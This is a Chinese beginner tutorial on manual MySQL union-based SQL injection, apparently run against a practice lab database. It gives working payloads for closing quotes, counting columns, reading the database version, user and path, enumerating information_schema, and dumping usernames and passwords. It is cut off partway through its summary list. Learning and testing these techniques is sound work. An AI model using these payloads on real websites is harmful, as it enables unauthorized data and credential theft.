---
title: SQL注入de基本注入流程（基础向）
url: https://www.secpulse.com/archives/205357.html
source: 安全脉搏
date: 2024-12-24
fetch_date: 2025-10-06T19:34:59.303948
---

# SQL注入de基本注入流程（基础向）

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# SQL注入de基本注入流程（基础向）

[Web安全](https://www.secpulse.com/archives/category/articles/web)

[Go](https://www.secpulse.com/newpage/author?author_id=50779)

2024-12-23

17,632

MySQL手工注入的基本步骤以及一些技巧的记录，当出现学习手工注入的时候，网上的文章参差不齐，导致很长一段时间对手工注入的理解一直处于一知半解的状态，特此记录本文，让小白们少走些弯路。本文只针对手工注入小白，大牛绕过轻喷。

# 步骤

### 注释或者闭合语句

首先看下一个基本的SQL语句查询源码：

$sql="SELECT \* FROM users WHERE id='$id' LIMIT 0,1";

![](https://image.3001.net/images/20180116/15161026736422.png!small)

下面的步骤默认都是采用这种基本的SQL语句的，其他的注入方法换汤不换药，这里只是想整理下注入的步骤与关键性的语句。

### 引号闭合语句

id =1 ' and '1' ='1

带入进源码中的SQL语句就是:

SELECT \* FROM users WHERE id='1 ' and '1' ='1' LIMIT 0,1

### 注释后面语句

常用的注释payload

or 1=1--+
'or 1=1--+
"or 1=1--+
)or 1=1--+
')or 1=1--+
") or 1=1--+
"))or 1=1--+
--+ 可以用#替换，url 提交过程中 Url 编码后的#为%23

带入进源码中的SQL语句就是:

SELECT \* FROM users WHERE id=''or 1=1--+' LIMIT 0,1

这样可以看出直接把后面的语句都给注释掉了，一般实战用注释比较多。

## and 验证

当然这里 and 验证和 or 验证都可以，二者区别不大:页面返回正常

```
?id=1' and 1=1 --+
?id=1' or 1=2 --+
```

### 页面返回异常

```
?id=1' and 1=2 --+
?id=1' or 1=1 --+
```

如果发现一开始页面先是正常然后是异常的话，说明页面啊存在注入。当然这里是最基本的判断方法，到后面盲注的时候是用延时函数来观察页面的返回时间的。

## 查询字段数目

查询字段数目主要利用MySQL里面的 order by 来判断字段数目，order by一般采用数学中的对半查找来判断具体的字段数目，这样效率会很高，下面假设用 order by 来判断一个未知字段的注入。

> ?id=1' order by 1 --+ 此时页面正常，继续换更大的数字测试?id=1' order by 10 --+ 此时页面返回错误，更换小的数字测试?id=1' order by 5 --+ 此时页面依然报错，继续缩小数值测试?id=1' order by 3 --+ 此时页面返回正常，更换大的数字测试?id=1' order by 4 --+ 此时页面返回错误，3正常，4错误，说明字段数目就是 3

通过数学的对半查找，确定字段数目。

## 联合查询

`UNION SELECT` 联合查询，手工注入经典语句，作用是在后面通过`UNION`把我们的恶意注入语句接上去，带入数据库进行查询。因为字段数目是:`3`,那么正规的语句如下:

```
?id=1' UNION SELECT 1,2,3 --+
```

这里页面是不会报错的，此时我们带入数据库的语句为:

> SELECT 1,2,3 这段语句没有任何意义，所以页面按返回正常。

![union查询](https://image.3001.net/images/20180116/15161026885293.png!small)

但是为了信息收集，我们得知道当前这个页面里面的值，调用的具体是数据库中的哪个字段才可以，可以故意构造一个错误的语句，来爆出错误的字段：

> id=-1' UNION SELECT 1,2,3 --+ 通过id=-1 一个负数不存在的id值来触发报错id=1' and 1=2 UNION SELECT 1,2,3 --+ 通过and 1=2 语句来触发报错id=1' or 1=1 UNION SELECT 1,2,3 --+ 通过or 1=1 语句来触发报错

![](https://image.3001.net/images/20180116/15161027044368.png!small)

可以看出爆出了具体的字段号了，这里爆出了`2`和`3`进MySQL数据库看下这个表的字段结构:

![](https://image.3001.net/images/20180116/15161027187603.png!small)

数据库表的结构完美验证了本次爆错出先的数字`2`和`3`，这里的数字代表字段，恰巧对应的字段值是:`username`和`password`。

## 收集信息

在爆出的字段值里面可以替换为我们的恶意语句，前期主要是收集信息，包括判断当前数据库是否是root用户，MySQL的版本等，一般收集这些信息常用一些MySQL自带的函数去收集信息:MySQL常用的系统函数

```
version()            #MySQL版本
user()               #数据库用户名
database()           #数据库名
@@datadir            #数据库路径
@@version_compile_os #操作系统版本
```

查询当前数据库名

```
id=1' and 1=2 UNION SELECT 1,database(),3 --+
```

![](https://image.3001.net/images/20180116/15161027536424.png!small)

### 查询MySQL版本

```
id=1' and 1=2 UNION SELECT 1,2,version() --+
```

![](https://image.3001.net/images/20180116/15161027756919.png!small)

### 查询数据库用户和路径

```
id=1' and 1=2 UNION SELECT 1,user(),@@datadir --+
```

![](https://image.3001.net/images/20180116/15161027897406.png!small)

查询数据库

查询数据库，一般来说我们注入的时候要查的就是当前的数据库，但有时候root权限就NB了还可以看到网站数据库之外的数据库内容。查询当前数据库

```
id=1' and 1=2 UNION SELECT 1,2,database() --+
```

![](https://image.3001.net/images/20180116/1516102900683.png!small)

这里用到了`group_concat`函数，由于本篇文章的定位是 手工注入的步骤 这里不在这里进行细化的讲解此类函数的用法。了解相关函数的话参考我的另一篇文章:[MySQL 手工注入之常见字符串函数](http://www.sqlsec.com/2018/01/concat.html)

## 查询表名

### database 查询数据库

```
id=1' and 1=2 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
```

![](https://image.3001.net/images/20180116/15161029355755.png!small)

### 单引号-数据库

这里的`database()`函数进行了数据库查询，因为我们已经查到了当前的数据库为`security`，所有这里还可以酱紫写，用单引号括把数据库的名称括起来`'security'`:

```
id=1' and 1=2 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+
```

### hex编码数据库

如果嫌单引号括起来麻烦的话，那么巧了！这里还有一个更麻烦的方法，就是将数据库名进行`hex`编码处理。使用火狐自带的`HackBar`插件可以快速的进行`hex`编码:

![](https://image.3001.net/images/20180116/15161029556650.gif!small)

`hex`编码后在前面加上`0x`表明这里是16进制编码。

![](https://image.3001.net/images/20180116/15161029872078.png!small)

目前主流的集中方法大致就是这样，还有一些先hex然后unhex `group_concat`的写法，据说可以绕waf类的，这里不是很常用就不再赘述了。 同理这些方法放到查询数据库的列名中也是可以使用的，要学会活学活用。

## 查询列名

目前收集到的信息为:

> 数据库名称: securuty数据库表名: emails,referers,uagents,users

做为一名黑客一定要有敏锐的嗅觉(手动dog)，这几个表中 一般我们都会去 继续猜解`users`表。下面用和查询数据库类似的方法去查询列名，关于原理的话 就是 `MySQL`下有一个`information_schema`里面会存所有数据库的一些相关信息:

![](https://image.3001.net/images/20180116/15161030266210.png!small)

既然都说到这里了，这里就顺便列举一下MySQL手工注入中，比较关键的`information_schema`里的信息:

### 记录关于数据库的信息

information\_schema 数据库下的 `schemata`表中的`schema_name`记录的是各个`数据库`的名称:

![](https://image.3001.net/images/20180116/15161030471595.png!small)

不仅这里记录了在 `tables`数据库下的`table_schema`表也记录了各个数据库的名称:

![](https://image.3001.net/images/20180116/15161030806093.png!small)

### 记录关于数据表的信息

information\_schema 数据库下的 `tables`表中的`table_name`记录的是各个`数据表`的名称:

![](https://image.3001.net/images/20180116/1516103097446.png!small)

> 这里是华丽的分割线，吃惊，一眨眼说不拓展的有忍不住扯了这么多，下面不多说直接来查询users表下的列名

```
id=1' and 1=2 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
```

![](https://image.3001.net/images/20180116/15161031097709.png!small)

## 查询字段值

由于在查询列名那里啰嗦的有点多，核心原理已经写在上面了,这里就简单的写出payload,:

```
id=1' and 1=2 UNION SELECT 1,2,group_concat(id,username,password) from users --+
```

知道了数据库、表名、各个字段名可以直接进行查询了，不需借助`information_schanem`数据库了。

![](https://image.3001.net/images/20180116/15161031198875.png!small)

## 简短的整理

本来是打算前面步骤中规中矩的写的，但还是忍不住写多了。于是又开出一个标题进行简短的整理:

> order by --+ 判断字段数目
>
> union select --+ 联合查询收集信息
>
> id=1' and 1=2 UNION SELECT 1,2,database() --+ 查询当前数据库
>
> id=1' and 1=2 UNION SELECT 1,2,group\_concat(schema\_name) from information\_schema.schemata --+查询所有数据库
>
> id=1' and 1=2 UNION SELECT 1,2,group\_concat(table\_name) from information\_schema.tables where table\_schema=database() --+ 查询表名
>
> id=1' and 1=2 UNION SELE...